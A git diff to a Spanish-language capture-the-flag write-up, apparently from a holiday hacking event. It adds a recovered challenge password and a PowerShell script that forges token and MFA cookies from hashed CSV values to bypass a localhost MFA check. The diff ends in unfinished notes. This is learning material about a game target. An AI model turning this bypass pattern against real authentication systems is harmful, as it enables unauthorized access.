@@ -162,7 +162,6 @@ Invoke-WebRequest -Uri 127.0.0.1:1225/mfa_validate/4216B4FAF4391EE4D3E0EC53A372B
 
 
 
-
 ## **Décimo desafío**
 Ahora necesitamos validar el token en el endpoint:
 
@@ -196,4 +195,53 @@ Write-Output $decoded
 
 ![[ps17.png]]
 
-Tal y como puede verse en la imagen, el output contiene la contrasena personal "SnowLeopard2ReadyForAction".
+Tal y como puede verse en la imagen, el output contiene la contraseña personal "*SnowLeopard2ReadyForAction*".
+
+Luego de completado, el elfo nos dice que es posible hacer un bypass de lo que hicimos anteriormente y escribir un script para completar el desafío. Ademas, nos da pistas acerca de como podemos lograrlo:
+
+![[ps18.png]]
+
+![[ps19.png]]
+
+Lo primero que se me ocurrió fue iterar sobre las filas del archivo `token_overview.csv` que contiene los endpoints (en principio) redactados y crear un archivo que contenga el Hash MD5, luego pipear cada uno de los contenidos de los archivos a `Get-FileHash -Algorithm SHA256` para obtener todos los hashes. Una vez hecho esto intentar verificar los endpoints contra la URI `http://127.0.0.1:1225/tokens/<sha256sum>`.
+
+Luego defino el siguiente script:
+
+```powershell
+$csv = "token_overview.csv"
+
+Import-Csv -Path $csv | ForEach-Object {
+	$md5 = $_.file_MD5hash
+	$temp = New-TemporaryFile
+	$md5 | Out-File -FilePath $temp.FullName -Encoding ASCII
+	$hash = (Get-FileHash -Path $temp.FullName -Algorithm SHA256).Hash.Trim()
+	Remove-Item -Path $temp.FullName -Force
+
+	$Headers = @{
+	    Authorization = $basicAuthValue
+	    Cookie = "token=$md5"
+	}
+
+	$mfa = (Invoke-WebRequest -Uri 127.0.0.1:1225/tokens/$hash -Headers $Headers).Links.href
+
+	$Headers = @{
+	    Authorization = $basicAuthValue
+	    Cookie = "token=$md5; mfa_token=$mfa"
+	}
+
+	(Invoke-WebRequest 127.0.0.1:1225/mfa_validate/$hash -Headers $Headers).Content
+}
+```
+
+Este script obtiene los valores MD5 de cada fila del archivo `token_overview.csv`, los guarda en un archivo con el mismo nombre que el hash, luego obtiene el hash SHA256 de cada uno de ellos y los envía hacia `http://127.0.0.1:1225/mfa_validate/<sha256sum>` para su verificación.
+
+Luego de ejecutado el script, obtuve:
+
+![[ps21.png]]
+
+
+Probar hasheando un md5 e ir contra el endpoint the mfa (mfa code endpoint)
+
+
+Al parecer
+
